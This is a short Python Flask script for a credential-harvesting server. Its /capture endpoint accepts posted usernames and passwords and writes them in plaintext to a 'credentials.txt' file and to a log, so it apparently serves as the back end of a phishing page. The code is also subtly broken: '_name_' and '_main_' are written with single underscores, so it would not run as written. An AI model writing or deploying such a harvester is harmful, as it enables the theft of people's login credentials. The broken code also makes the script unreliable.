from flask import Flask, request, jsonify
import os
import logging

# Configure logging
logging.basicConfig(filename='app.log', level=logging.INFO)

app = Flask(_name_)

# Use environment variables for configuration
CAPTURE_FILE = os.getenv('CAPTURE_FILE', 'credentials.txt')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json()
        username = data.get('username', '')
        password = data.get('password', '')

        # Validate input
        if not username or not password:
            logging.error("Missing username or password in request data")
            return jsonify({"status": "error", "message": "Invalid input"}), 400

        # Save credentials to a file
        with open(CAPTURE_FILE, 'a') as f:
            f.write(f"Username: {username}, Password: {password}\n")

        logging.info(f"Captured credentials: Username: {username}, Password: {password}")
        return jsonify({"status": "success"})

    except Exception as e:
        logging.error(f"Error capturing credentials: {e}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500

if _name_ == '_main_':
    app.run(debug=True)
